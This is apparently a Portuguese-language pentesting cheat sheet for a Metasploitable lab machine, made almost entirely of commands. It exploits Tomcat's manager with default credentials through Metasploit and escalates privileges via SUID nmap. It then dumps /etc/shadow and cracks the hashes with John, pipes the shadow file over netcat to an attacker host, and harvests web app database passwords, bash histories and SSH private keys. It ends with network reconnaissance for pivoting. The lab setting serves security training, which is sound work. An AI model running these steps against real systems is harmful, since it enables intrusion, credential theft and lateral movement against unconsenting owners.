# 8180 (Tomcat) – Credenciais padrão
	
	msfconsole
	use exploit/multi/http/tomcat_mgr_deploy
	set RHOSTS 10.0.0.114
	set RPORT 8180
	set HttpUsername tomcat
	set HttpPassword tomcat
	exploit

	# Caso funcione isso abre o Meterpreter = Meta-Interpreter (Meta-interpretador). É um payload especial do Metasploit que não cria um shell comum, mas sim uma "plataforma de ataque" dentro da memória da vítima, sem gravar nada no disco.
	# Opção de comando 'shell' para terminal com comandos nativos do sistema (não root), podendo escalar privilégio.

	Características:
		Totalmente na memória (mais furtivo)
		Comandos próprios: 'help' para listar (não precisa de binários do sistema)
		Extensível (pode carregar módulos novos)
		Criptografado (comunicação segura)

### Obter outras informações e credenciais do Servidor Metasploitable (dentro do Shell/Backdoor):

1. Verificar nível de acesso
# bash:
	whoami
	id
		# Se for root, o acesso é total. Caso contrário, tente escalar privilégio com 'sudo su' se tiver senhas
		

11. Escalar privilégio (caso não seja root)
# tente:
	sudo -l
	uname -a                         # kernel vulnerável?
	find / -perm -4000 2>/dev/null   # suid binaries: ver arquivos com permissão SUID (podem dar root)
	
		# Nmap interativo com SUID (versões antigas)
			/usr/bin/nmap --interactive
			nmap> !sh
			whoami    # provavelmente mostrará 'root'

2. Extraia hashes de senhas do sistema

	cat /etc/passwd
	cat /etc/shadow
	
	
13. Quebrar hashes offline com John ou Hashcat (opcional):
#Salve os hashes num arquivo hashes.txt no formato que o John espera (ex: root:$1$...:0:0:root:/root:/bin/bash ou apenas o hash com identificação). Depois:

	john --format=md5crypt hashes.txt
	john --show hashes.txt
	

12. Transferir arquivos para sua máquina
	# No atacante:

		nc -lvnp 4444 > arquivo.txt

	# No Metasploitable:
	
		cat /etc/shadow | nc 10.0.0.100 4444
			# ou copiar manualmente.

3. Liste todos os usuários com shell

	grep -E "/(bash|sh|dash|zsh)" /etc/passwd
	
	
6. Arquivos de configuração de aplicações web
	
	DVWA: /var/www/dvwa/config/config.inc.php (contém senha do banco)

	TikiWiki: /var/www/tikiwiki/db/tiki-db.php ou /var/www/tikiwiki195/db/local.php

	phpMyAdmin: /etc/phpmyadmin/config.inc.php

	WebDAV: verifique se há arquivos de usuários em /var/www/dav/

	Comandos:
		cat /var/www/dvwa/config/config.inc.php
		cat /var/www/tikiwiki/db/tiki-db.php
		cat /etc/phpmyadmin/config.inc.php
		
7. Históricos de usuários

	cat /home/msfadmin/.bash_history
	cat /home/user/.bash_history
	cat /root/.bash_history
	
	
8. Chaves SSH e credenciais

	ls -la /home/msfadmin/.ssh/
	cat /home/msfadmin/.ssh/id_rsa
	cat /home/msfadmin/.ssh/authorized_keys
	
10. Informações de rede e vizinhança

	ifconfig
	arp -a
	netstat -tulpn
	route -n
		# Isso mostra outros hosts na rede, possíveis alvos para pivoting.
